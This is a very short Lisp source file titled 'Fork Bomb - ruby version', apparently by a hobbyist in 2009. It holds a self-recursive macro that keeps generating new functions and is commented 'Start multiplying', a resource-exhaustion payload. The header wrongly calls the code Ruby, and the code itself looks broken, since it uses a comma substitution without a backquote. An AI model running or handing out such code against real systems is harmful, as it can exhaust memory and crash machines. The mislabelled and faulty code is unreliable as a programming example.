;; Fork Bomb - ruby version
;;
;; Author: Tommy
;; Date: 2009-10-03 18:50


(defmacro wabbit ()					;; A program that writes code.
	(let ((fname (gentemp 'INET)))
		(progn
			(defun ,fname ()        ;; Generate.
				nil)
			(wabbit))))

(wabbit)	;; Start multiplying.
